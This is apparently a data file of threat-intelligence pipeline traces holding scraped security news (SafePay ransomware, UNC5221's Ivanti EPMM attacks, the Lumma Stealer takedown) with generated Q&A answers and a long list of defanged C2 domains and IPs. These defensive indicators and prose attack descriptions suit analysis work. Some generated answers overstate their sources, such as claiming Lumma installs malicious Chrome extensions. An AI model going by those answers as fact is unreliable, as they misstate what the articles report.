https://weekly.infosecwriteups.com/\n\nFollow publication\n\nMember-only story\n\n# MITM HTTPS Payload with Python\n\n--\n\nShare\n\nMITM HTTPS Payload\n\nA lightweight MITM-based tool for monitoring encrypted traffic and detecting threats — powered by AI and built in Python\n\nIn Cybersecurity, what you can’t see can hurt you.\n\nModern threats hide inside encrypted HTTPS traffic. While that encryption protects privacy, it also creates blind spots for defenders. Security analysts, incident responders, and threat hunters need tools that can safely lift the veil.\n\nthat’s why I build SecretAgent — a Python-based tool that uses Man-in-the-Middle (MITM) techniques to intercept and inspect HTTPS and HTTP traffic, with early-stage AI integration for threat detection.\n\n# A MITM Proxy for Security Inspection\n\nSecretAgent operates as a local MITM proxy, meaning it intercepts traffic between your system and the internet. By acting as an intermediary, it can decrypt HTTPS sessions on the fly, giving security teams full visibility into:\n\n- Domains and IPs\n- Headers and metadata\n- URL paths and query strings\n- POST payloads and more\n\nThis inspection method is extremely useful when analyzing:\n\n- Malware-infected systems\n- Outbound data exfiltration attempts\n\n--\n\n--\n\n## Published in InfoSec Write-ups\n\nA collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/\n\n## Written by Aris Haryanto\n\nCybersecurity\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/weekly-recap-apt-campaigns-browser.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://securityaffairs.com/178295/data-breach/marlboro-chesterfield-pathology-data-breach-impacted-235911-individuals.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware involved is SafePay ransomware.", "question": "What kind of malware is it?"}, {"answer": "The attack involved is a ransomware attack, specifically by the SafePay ransomware group.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The breach exposed personal details such as names, addresses, birth dates, medical treatment information, and health insurance data, including policy numbers, but it does not mention credit cards or bank information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals personal details such as names, addresses, birth dates, medical treatment information, and health insurance data, including policy numbers.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted location is North Carolina, specifically the lab Marlboro-Chesterfield Pathology in Pinehurst, NC, which serves the Carolinas.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://securityaffairs.com/178295/data-breach/marlboro-chesterfield-pathology-data-breach-impacted-235911-individuals.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["apt", "intelligence", "browser", "threat"], "article_textual_content": "# Marlboro-Chesterfield Pathology data breach impacted 235,911 individuals\n\n## SafePay ransomware hit Marlboro-Chesterfield Pathology, stealing personal data of 235,000 people in a major breach.\n\nSafePay ransomware hit Marlboro-Chesterfield Pathology, stealing personal data of 235,000 people in a major breach at the North Carolina-based lab.\n\nMarlboro-Chesterfield Pathology (MCP), founded in 1990 in Pinehurst, NC, is a full-service lab offering molecular, cytology, and pathology testing. Known for its advanced digital and molecular facilities, MCP provides FDA-approved diagnostics to support physicians and patients across the Carolinas.\n\nThe security breach occurred on January 16, 2025, threat actors gained unauthorized access to internal systems. The company launched an investigation into the incident and steps were taken to secure systems. The company notified law enforcement and attempted to delete the stolen personal information, suggesting that the organization suffered a ransomware attack. According to the data breach notification, the company identified affected individuals by March 31, 2025.\n\n“On or around January 16, 2025, we experienced unauthorized activity on certain of our internal IT systems. Based on our subsequent investigation, we determined that an unauthorized party accessed our systems and acquired certain records from our systems. We took prompt action and quickly engaged third-party specialists to assist us in securing our systems and investigating the incident. Law enforcement is aware of the incident and we have cooperated with their investigation. The involvement of law enforcement did not delay this notification.” reads the data breach notification sent to the impacted individuals. “Through a thorough investigation and extensive review of the impacted data, which concluded on March 31, 2025, we determined that some of your personal information was contained in the affected records. We took steps, to the best of our ability and knowledge, to ensure that the data taken by the unauthorized party was deleted.”\n\nMarlboro-Chesterfield Pathology disclosed that the breach exposed personal details such as names, addresses, birth dates, medical treatment information, and health insurance data, including policy numbers. The stolen information varies by individual. The company emphasized that, so far, there have been no reports of identity theft. In response, they secured their systems, brought in forensic experts to investigate, and strengthened their network defenses.\n\nThe company notified the US Department of Health and Human Services (HHS) that the data breach impacted 235,911 individuals.\n\nAs of now, the ransomware group has not added the healthcare organization to its leak site.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, data breach)\n\n#### you might also like\n\n##### China-linked APT UNC5221 started exploiting Ivanti EPMM flaws shortly after their disclosure\n\n##### Fake software activation videos on TikTok spread Vidar, StealC\n\n#### leave a comment\n\n#### newsletter\n\n###### Subscribe to my email list and stay\n up-to-date!\n\n#### recent articles\n\n###### Marlboro-Chesterfield Pathology data breach impacted 235,911 individuals\n\nData Breach / May 26, 2025\n\n###### China-linked APT UNC5221 started exploiting Ivanti EPMM flaws shortly after their disclosure\n\nAPT / May 26, 2025\n\n###### Fake software activation videos on TikTok spread Vidar, StealC\n\nCyber Crime / May 26, 2025\n\n###### SECURITY AFFAIRS MALWARE NEWSLETTER ROUND 46\n\nBreaking News / May 25, 2025\n\n###### Security Affairs newsletter Round 525 by Pierluigi Paganini – INTERNATIONAL EDITION\n\nBreaking News / May 25, 2025\n\nTo contact me write an email to:\n\n\n                            Pierluigi Paganini : \n\n[email protected]\n\n#### QUICK LINKS\n\n- Home\n- Cyber Crime\n- Cyber warfare\n- APT\n- Data Breach\n- Deep Web\n- Digital ID\n- Hacking\n- Hacktivism\n- Intelligence\n- Internet of Things\n- Laws and regulations\n- Malware\n- Mobile\n- Reports\n- Security\n- Social Networks\n- Terrorism\n- ICS-SCADA\n- POLICIES\n- Contact me\n\nCopyright@securityaffairs 2024\n\nWe use cookies on our website to give you the most relevant experience by remembering your preferences and repeat visits. By clicking “Accept All”, you consent to the use of ALL the cookies. However, you may visit \"Cookie Settings\" to provide a controlled consent.\n\n#### Privacy Overview\n\nThis website uses cookies to improve your experience while you navigate through the website. Out of these cookies, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may have an effect on your browsing experience.\n\nNecessary cookies are absolutely essential for the website to function properly. This category only includes cookies that ensures basic functionalities and security features of the website. These cookies do not store any personal information.\n\nAny cookies that may not be particularly necessary for the website to function and is used specifically to collect user personal data via analytics, ads, other embedded contents are termed as non-necessary cookies. It is mandatory to procure user consent prior to running these cookies on your website."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://securityaffairs.com/178285/apt/china-linked-apt-unc5221-started-exploiting-ivanti-epmm-flaws-shortly-after-their-disclosure.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware used by the China-linked APT group UNC5221 includes KrustyLoader and Sliver backdoor.", "question": "What kind of malware is it?"}, {"answer": "It involves a remote code execution (RCE) vulnerability and an authentication bypass attack, allowing attackers to execute arbitrary code on the target system without proper credentials.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals sensitive information such as mobile device data (IMEI, SIM, location), LDAP user details, and Office 365 tokens, as well as credentials, including email and SharePoint access.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is exfiltrated, and in some cases, it is saved in temporary directories for later exfiltration, but the context does not specify where the information is forwarded.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations include Europe, North America, and the Asia-Pacific region, with critical sectors such as healthcare, telecommunications, aviation, municipal government, finance, and defense being affected.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://securityaffairs.com/178285/apt/china-linked-apt-unc5221-started-exploiting-ivanti-epmm-flaws-shortly-after-their-disclosure.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": ["malicious", "backdoor", "apt", "intelligence", "browser", "threat"], "article_textual_content": "# China-linked APT UNC5221 started exploiting Ivanti EPMM flaws shortly after their disclosure\n\n## China-linked APT exploit Ivanti EPMM flaws to target critical sectors across Europe, North America, and Asia-Pacific, according to EclecticIQ.\n\nResearchers from EclecticIQ observed a China-linked APT group that chained two Ivanti EPMM flaws, tracked as CVE-2025-4427 and CVE-2025-4428, in attacks against organizations in Europe, North America, and Asia-Pacific.\n\nBelow is the description of the flaws:\n\n- CVE-2025-4427 (CVSS score: 5.3) – An authentication bypass in Endpoint Manager Mobile allowing attackers to access protected resources without proper credentials.\n- CVE-2025-4428 (CVSS score: 7.2) – A remote code execution vulnerability in Endpoint Manager Mobile allowing attackers to execute arbitrary code on the target system.\n\nCERT-EU reported both vulnerabilities to the software firm.\n\nIvanti confirmed that threat actors could chain the two vulnerabilities to achieve remote code execution without authentication.\n\n“Ivantii has released updates for Endpoint Manager Mobile (EPMM) which addresses one medium and one high severity vulnerability. When chained together, successful exploitation could lead to unauthenticated remote code execution.” reads the advisory. “We are aware of a very limited number of customers whose solution has been exploited at the time of disclosure.”\n\nEclecticIQ observed active exploitation of Ivanti EPMM flaws starting May 15, 2025 (the same day Ivanti disclosed two critical vulnerabilities) targeting internet-exposed systems.\n\n“EclecticIQ analysts observed active exploitation of this vulnerability chain in the wild, targeting internet-facing Ivanti EPMM deployments.” reads the post published by EclecticIQ. “The earliest observed exploitation activity dates back to May 15, 2025. Targeted organizations span critical sectors including healthcare, telecommunications, aviation, municipal government, finance, and defense across Europe, North America, and the Asia-Pacific region.”\n\nThe researchers linked the attacks to China-linked group UNC5221 that exploited Ivanti EPMM flaws to steal PII and credentials, enabling lateral movement. The group repurposed system tools and targeted mobile device management. Ivanti has released patches; users are urged to update immediately.\n\nThreat actors exploited an unauthenticated RCE flaw in Ivanti EPMM via the /mifs/rs/api/v2/?format= endpoint, using Java Reflection to run remote commands. Then attackers gained reverse shells and read output using crafted HTTP GET requests, forming a C2 channel. These techniques enabled full remote control over targeted systems through server-side Java injection.\n\nChinese cyber spies deployed the KrustyLoader malware on Ivanti EPMM systems, using Amazon S3 buckets to deliver their malicious files. Researchers observed that the attackers relied on standard Linux tools like wget and curl to download an encrypted version of the Sliver backdoor. KrustyLoader then decrypted the payload using built-in AES keys and loaded it directly into memory, giving the attackers stealthy, long-term access—even after the system was patched.\n\nEclecticIQ analysts found that Chinese-linked hackers targeted the mifs database in Ivanti EPMM systems as a key part of their espionage campaigns. After breaching the system, they used hardcoded MySQL credentials, stored insecurely in system files, to access the database, which contains sensitive information like mobile device data (IMEI, SIM, location), LDAP user details, and Office 365 tokens.\n\nUsing tools like mysqldump and Bash scripts downloaded from paste sites, the attackers extracted LDAP configs, Office 365 credentials, and metadata on managed devices. This information could allow unauthorized access to Microsoft cloud services like email and SharePoint.\n\nThe attackers also dumped memory from Java processes to search for more credentials, saving the data in temporary directories for later exfiltration. In short, they abused built-in Ivanti tools and weak credential storage to steal vast amounts of sensitive data—likely for espionage targeting key public and private sector individuals.\n\nChinese-linked hackers deployed FRP (Fast Reverse Proxy) on compromised Ivanti EPMM systems to maintain stealthy access. Downloaded from an attacker-controlled IP, FRP allowed reverse SOCKS5 connections, enabling internal network scanning and lateral movement. Using tools like wget, they staged and launched KrustyLoader malware, hid reconnaissance output as fake JPG files, and exfiltrated data before deleting traces.\n\n“EclecticIQ assesses with high confidence that the observed Ivanti EPMM exploitation activity is very likely linked to UNC5221, a China-nexus cyber-espionage group. Infrastructure reuse and observed tradecraft closely align with previous campaigns attributed to this actor.” concludes the report.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, China)\n\n#### you might also like\n\n##### Marlboro-Chesterfield Pathology data breach impacted 235,911 individuals\n\n##### Fake software activation videos on TikTok spread Vidar, StealC\n\n#### leave a comment\n\n#### newsletter\n\n###### Subscribe to my email list and stay\n up-to-date!\n\n#### recent articles\n\n###### Marlboro-Chesterfield Pathology data breach impacted 235,911 individuals\n\nData Breach / May 26, 2025\n\n###### China-linked APT UNC5221 started exploiting Ivanti EPMM flaws shortly after their disclosure\n\nAPT / May 26, 2025\n\n###### Fake software activation videos on TikTok spread Vidar, StealC\n\nCyber Crime / May 26, 2025\n\n###### SECURITY AFFAIRS MALWARE NEWSLETTER ROUND 46\n\nBreaking News / May 25, 2025\n\n###### Security Affairs newsletter Round 525 by Pierluigi Paganini – INTERNATIONAL EDITION\n\nBreaking News / May 25, 2025\n\nTo contact me write an email to:\n\n\n                            Pierluigi Paganini : \n\n[email protected]\n\n#### QUICK LINKS\n\n- Home\n- Cyber Crime\n- Cyber warfare\n- APT\n- Data Breach\n- Deep Web\n- Digital ID\n- Hacking\n- Hacktivism\n- Intelligence\n- Internet of Things\n- Laws and regulations\n- Malware\n- Mobile\n- Reports\n- Security\n- Social Networks\n- Terrorism\n- ICS-SCADA\n- POLICIES\n- Contact me\n\nCopyright@securityaffairs 2024\n\nWe use cookies on our website to give you the most relevant experience by remembering your preferences and repeat visits. By clicking “Accept All”, you consent to the use of ALL the cookies. However, you may visit \"Cookie Settings\" to provide a controlled consent.\n\n#### Privacy Overview\n\nThis website uses cookies to improve your experience while you navigate through the website. Out of these cookies, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the website. We also use third-party cookies that help us analyze and understand how you use this website. These cookies will be stored in your browser only with your consent. You also have the option to opt-out of these cookies. But opting out of some of these cookies may have an effect on your browsing experience.\n\nNecessary cookies are absolutely essential for the website to function properly. This category only includes cookies that ensures basic functionalities and security features of the website. These cookies do not store any personal information.\n\nAny cookies that may not be particularly necessary for the website to function and is used specifically to collect user personal data via analytics, ads, other embedded contents are termed as non-necessary cookies. It is mandatory to procure user consent prior to running these cookies on your website."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.catonetworks.com/blog/cato-ctrl-suspected-russian-threat-actors/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.welivesecurity.com/en/eset-research/eset-takes-part-global-operation-disrupt-lumma-stealer/", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "Lumma Stealer is an infostealer malware, specifically a malware-as-a-service (MaaS) infostealer.", "question": "What kind of malware is it?"}, {"answer": "Lumma Stealer involves a malware-as-a-service (MaaS) infostealer attack, which is designed to steal sensitive information such as credentials, passwords, and other valuable data from compromised systems.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "Yes, Lumma Stealer gathers credentials from multiple browsers, including web browser extension data and databases containing passwords, session cookies, and autofill data.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, Lumma Stealer targets Chromium-based browser extensions for exfiltration, and its dynamic configuration contains a list of extension IDs and names to target.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "Yes, Lumma Stealer is designed to steal sensitive information, including credit card numbers, bank account information, and other financial data, in addition to login credentials, passwords, and other personal data.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, Lumma Stealer is related to a wallet stealer, as it targets and steals data from cryptocurrency wallets, among other things.", "question": "Is it related to wallet stealer?"}, {"answer": "Lumma Stealer malware steals various types of information, including web browser extension data, databases containing passwords, session cookies, web browsing history, and autofill data. It also targets data from password managers, VPNs, FTP clients, cloud services, remote desktop applications, email clients, cryptocurrency wallets, and note-taking applications.", "question": "What kind of information the malware steals?"}, {"answer": "Lumma Stealer forwards the stolen information to its Command and Control (C&amp;C) servers, which are hidden behind Cloudflare services. The C&amp;C servers are located at various domains and IP addresses, some of which are listed in the IoCs section of the article.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.welivesecurity.com/en/eset-research/eset-takes-part-global-operation-disrupt-lumma-stealer/", "error": null, "summary": "Here is a concise 4-5 sentence summary of the article:\n\nThe main threat discussed is Lumma Stealer, a malware-as-a-service (MaaS) infostealer that has been actively developed and maintained by its operators, with key techniques including encryption, obfuscation, and anti-analysis methods. The malware targets a wide range of data, including web browser credentials, password manager data, and cryptocurrency wallets, and is distributed through various methods such as phishing, cracked software, and other malware downloaders. The targets of Lumma Stealer are global, with the malware having been detected in various regions around the world, and the potential impact includes the theft of sensitive data and credentials, which can be sold on the cybercrime underground or used for further malicious activities. The disruption operation, led by Microsoft and involving ESET and other partners, aims to seize Lumma Stealer's command and control (C2) domains and render its exfiltration infrastructure non-functional. By disrupting Lumma Stealer's operations, the goal is to prevent further data theft and protect potential victims from the malware's harmful activities.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "cooperatvassquaidmew[.]xyz"}, {"type": "Domain or URL", "value": "crisisrottenyjs[.]xyz"}, {"type": "Domain or URL", "value": "deadtrainingactioniw[.]xyz"}, {"type": "Domain or URL", "value": "exuberanttjdkwo[.]xyz"}, {"type": "Domain or URL", "value": "grandcommonyktsju[.]xyz"}, {"type": "Domain or URL", "value": "qualificationjdwko[.]xyz"}, {"type": "Domain or URL", "value": "sweetcalcutangkdow[.]xyz"}, {"type": "Domain or URL", "value": "wordingnatturedowo[.]xyz"}, {"type": "Domain or URL", "value": "bigmouthudiop[.]shop"}, {"type": "Domain or URL", "value": "froytnewqowv[.]shop"}, {"type": "Domain or URL", "value": "locatedblsoqp[.]shop"}, {"type": "Domain or URL", "value": "stagedchheiqwo[.]shop"}, {"type": "Domain or URL", "value": "callosallsaospz[.]shop"}, {"type": "Domain or URL", "value": "indexterityszcoxp[.]shop"}, {"type": "Domain or URL", "value": "lariatedzugspd[.]shop"}, {"type": "Domain or URL", "value": "liernessfornicsa[.]shop"}, {"type": "Domain or URL", "value": "outpointsozp[.]shop"}, {"type": "Domain or URL", "value": "shepherdlyopzc[.]shop"}, {"type": "Domain or URL", "value": "unseaffarignsk[.]shop"}, {"type": "Domain or URL", "value": "upknittsoappz[.]shop"}, {"type": "Domain or URL", "value": "bassizcellskz[.]shop"}, {"type": "Domain or URL", "value": "byteplusx[.]digital"}, {"type": "Domain or URL", "value": "sparkiob[.]digital"}, {"type": "Domain or URL", "value": "nighetwhisper[.]top"}, {"type": "Domain or URL", "value": "exemplarou[.]sbs"}, {"type": "Domain or URL", "value": "exilepolsiy[.]sbs"}, {"type": "Domain or URL", "value": "frizzettei[.]sbs"}, {"type": "Domain or URL", "value": "invinjurhey[.]sbs"}, {"type": "Domain or URL", "value": "isoplethui[.]sbs"}, {"type": "Domain or URL", "value": "laddyirekyi[.]sbs"}, {"type": "Domain or URL", "value": "wickedneatr[.]sbs"}, {"type": "Domain or URL", "value": "usseorganizedw[.]shop"}, {"type": "Domain or URL", "value": "bellflamre[.]click"}, {"type": "Domain or URL", "value": "tripfflux[.]world"}, {"type": "Domain or URL", "value": "beerishint[.]sbs"}, {"type": "Domain or URL", "value": "1212tank.activitydmy[.]icu"}, {"type": "Domain or URL", "value": "brownieyuz[.]sbs"}, {"type": "Domain or URL", "value": "ducksringjk[.]sbs"}, {"type": "Domain or URL", "value": "explainvees[.]sbs"}, {"type": "Domain or URL", "value": "relalingj[.]sbs"}, {"type": "Domain or URL", "value": "repostebhu[.]sbs"}, {"type": "Domain or URL", "value": "rottieud[.]sbs"}, {"type": "Domain or URL", "value": "thinkyyokej[.]sbs"}, {"type": "Domain or URL", "value": "bashfulacid[.]lat"}, {"type": "Domain or URL", "value": "tentabatte[.]lat"}, {"type": "Domain or URL", "value": "curverpluch[.]lat"}, {"type": "Domain or URL", "value": "lev-tolstoi[.]com"}, {"type": "Domain or URL", "value": "manyrestro[.]lat"}, {"type": "Domain or URL", "value": "toppyneedus[.]biz"}, {"type": "Domain or URL", "value": "shapestickyr[.]lat"}, {"type": "Domain or URL", "value": "slipperyloo[.]lat"}, {"type": "Domain or URL", "value": "steamcommunity[.]com"}, {"type": "Domain or URL", "value": "talkynicer[.]lat"}, {"type": "Domain or URL", "value": "wordyfindy[.]lat"}, {"type": "Domain or URL", "value": "beevasyeip[.]bond"}, {"type": "Domain or URL", "value": "broadecatez[.]bond"}, {"type": "Domain or URL", "value": "encirelk[.]cyou"}, {"type": "Domain or URL", "value": "granystearr[.]bond"}, {"type": "Domain or URL", "value": "quarrelepek[.]bond"}, {"type": "Domain or URL", "value": "rockemineu[.]bond"}, {"type": "Domain or URL", "value": "suggestyuoz[.]biz"}, {"type": "Domain or URL", "value": "tranuqlekper[.]bond"}, {"type": "Domain or URL", "value": "codxefusion[.]top"}, {"type": "Domain or URL", "value": "earthsymphzony[.]today"}, {"type": "Domain or URL", "value": "climatologfy[.]top"}, {"type": "Domain or URL", "value": "experimentalideas[.]today"}, {"type": "Domain or URL", "value": "gadgethgfub[.]icu"}, {"type": "Domain or URL", "value": "hardrwarehaven[.]run"}, {"type": "Domain or URL", "value": "hardswarehub[.]today"}, {"type": "Domain or URL", "value": "pixtreev[.]run"}, {"type": "Domain or URL", "value": "quietswtreams[.]life"}, {"type": "Domain or URL", "value": "socialsscesforum[.]icu"}, {"type": "Domain or URL", "value": "techmindzs[.]live"}, {"type": "Domain or URL", "value": "techspherxe[.]top"}, {"type": "Domain or URL", "value": "appgridn[.]live"}, {"type": "Domain or URL", "value": "lunoxorn[.]top"}, {"type": "Domain or URL", "value": "skynetxc[.]live"}, {"type": "Domain or URL", "value": "targett[.]top"}, {"type": "Domain or URL", "value": "travewlio[.]shop"}, {"type": "Domain or URL", "value": "changeaie[.]top"}, {"type": "Domain or URL", "value": "clarmodq[.]top"}, {"type": "Domain or URL", "value": "liftally[.]top"}, {"type": "Domain or URL", "value": "piratetwrath[.]run"}, {"type": "Domain or URL", "value": "quilltayle[.]live"}, {"type": "Domain or URL", "value": "salaccgfa[.]top"}, {"type": "Domain or URL", "value": "starofliught[.]top"}, {"type": "Domain or URL", "value": "zestmodp[.]top"}, {"type": "Domain or URL", "value": "equatorf[.]run"}, {"type": "Domain or URL", "value": "hemispherexz[.]top"}, {"type": "Domain or URL", "value": "latitudert[.]live"}, {"type": "Domain or URL", "value": "sectorecoo[.]live"}, {"type": "IP Address", "value": "172.67.134.100"}, {"type": "IP Address", "value": "172.67.175.165"}, {"type": "IP Address", "value": "188.114.96.1"}, {"type": "IP Address", "value": "172.67.141.43"}, {"type": "IP Address", "value": "188.114.96.3"}, {"type": "IP Address", "value": "104.21.92.96"}, {"type": "IP Address", "value": "172.67.209.200"}, {"type": "IP Address", "value": "104.21.49.80"}, {"type": "IP Address", "value": "188.114.97.0"}, {"type": "IP Address", "value": "104.21.19.156"}, {"type": "IP Address", "value": "172.67.153.40"}, {"type": "IP Address", "value": "172.67.192.52"}, {"type": "IP Address", "value": "172.67.213.85"}, {"type": "IP Address", "value": "172.67.137.78"}, {"type": "IP Address", "value": "172.67.221.214"}, {"type": "IP Address", "value": "172.67.204.158"}, {"type": "IP Address", "value": "172.67.178.194"}, {"type": "IP Address", "value": "172.67.158.159"}, {"type": "IP Address", "value": "172.67.204.20"}, {"type": "IP Address", "value": "104.21.35.48"}, {"type": "IP Address", "value": "104.21.73.43"}, {"type": "IP Address", "value": "188.114.97.9"}, {"type": "IP Address", "value": "172.67.166.231"}, {"type": "IP Address", "value": "104.21.16.180"}, {"type": "IP Address", "value": "172.67.146.35"}, {"type": "IP Address", "value": "104.21.19.91"}, {"type": "IP Address", "value": "172.67.192.43"}, {"type": "IP Address", "value": "188.114.97.1"}, {"type": "IP Address", "value": "188.114.97.7"}, {"type": "IP Address", "value": "104.21.86.54"}, {"type": "IP Address", "value": "172.64.80.1"}, {"type": "IP Address", "value": "188.114.97.2"}, {"type": "IP Address", "value": "172.67.192.247"}, {"type": "IP Address", "value": "104.105.90.131"}, {"type": "IP Address", "value": "172.67.146.68"}, {"type": "IP Address", "value": "172.67.184.241"}, {"type": "IP Address", "value": "104.21.26.124"}, {"type": "IP Address", "value": "172.67.178.7"}, {"type": "IP Address", "value": "104.21.47.117"}, {"type": "IP Address", "value": "104.21.72.121"}, {"type": "IP Address", "value": "188.114.96.2"}, {"type": "IP Address", "value": "104.21.42.7"}, {"type": "IP Address", "value": "104.21.85.126"}, {"type": "IP Address", "value": "172.67.161.40"}, {"type": "IP Address", "value": "172.67.176.107"}, {"type": "IP Address", "value": "172.67.215.114"}, {"type": "IP Address", "value": "172.67.143.12"}, {"type": "IP Address", "value": "104.21.5.146"}, {"type": "IP Address", "value": "104.21.32.1"}, {"type": "IP Address", "value": "172.67.147.123"}, {"type": "IP Address", "value": "104.21.112.1"}, {"type": "IP Address", "value": "104.21.20.106"}, {"type": "IP Address", "value": "172.67.216.12"}], "mitre_ttps": null, "keywords_found": ["botnet", "cryptocurrency", "threat", "analysis", "wallet", "browser", "cybercrime", "bank", "banking trojan", "fraud", "malicious", "infostealers", "phishing", "passwords", "apt"], "article_textual_content": "# ESET takes part in global operation to disrupt Lumma Stealer\n\nOur intense monitoring of tens of thousands of malicious samples helped this global disruption operation\n\nJakub Tomanek\n\n21 May 2025\n • \n, \n21 min. read\n\nESET has collaborated with Microsoft, BitSight, Lumen, Cloudflare, CleanDNS, and GMO Registry in a global disruption operation against Lumma Stealer, an infamous malware-as-a-service (MaaS) infostealer. The operation targeted Lumma Stealer infrastructure with all known C&amp;C servers in the past year, rendering the exfiltration network, or a large part of it, nonoperational.\n\n- ESET took part in a coordinated global operation to disrupt Lumma Stealer.\n- ESET provided technical analysis and statistical information, and extracted essential data from tens of thousands of malware samples.\n- We provide an overview of the Lumma Stealer MaaS ecosystem.\n- We also provide technical analysis and an overview of the evolution of Lumma Stealer’s key static and dynamic properties, which were critical to the disruption effort.\n\n## Disruption contribution\n\nESET automated systems processed tens of thousands of Lumma Stealer samples, dissecting them to extract key elements, such as C&amp;C servers and affiliate identifiers. This allowed us to continuously monitor Lumma Stealer’s activity, track development updates, cluster affiliates, and more.\n\nInfostealer malware families, like Lumma Stealer, are typically just a foreshadowing of a future, much more devastating attack. Harvested credentials are a valued commodity in the cybercrime underground, sold by initial access brokers to various other cybercriminals, including ransomware affiliates. Lumma Stealer has been one of the most prevalent infostealers over the past two years, and ESET telemetry (see Figure 1) confirms that it has left no part of the world untouched.\n\nFigure 1. Lumma Stealer detection rate (data since July 2024)\n\nLumma Stealer developers had been actively developing and maintaining their malware. We have regularly noticed code updates ranging from minor bug fixes to complete replacement of string encryption algorithms and changes to the network protocol. The operators also actively maintained the shared exfiltration network infrastructure. Between June 17th, 2024 and May 1st, 2025, we observed a total of 3,353 unique C&amp;C domains, averaging approximately 74 new domains emerging each week including occasional updates to Telegram-based dead-drop resolvers (see Figure 2). We discuss the details of the network infrastructure later in the blogpost.\n\nFigure 2. Weekly counts of new C&amp;C domains\n\nThis ongoing evolution underscores the significant threat posed by Lumma Stealer and highlights the importance and complexity of the disruption effort.\n\n## Background\n\nOver the past two years, Lumma Stealer (also known as LummaC or LummaC2) has emerged as one of the most active infostealers in the cybercrime ecosystem, becoming a favored tool among cybercriminals due to its active development of malware features and its infrastructure being sold as a service.\n\n### Malware as a service\n\nLumma Stealer adopts the concept of malware as a service (MaaS), where affiliates pay a monthly fee, based on their tier, to receive the latest malware builds and the network infrastructure necessary for data 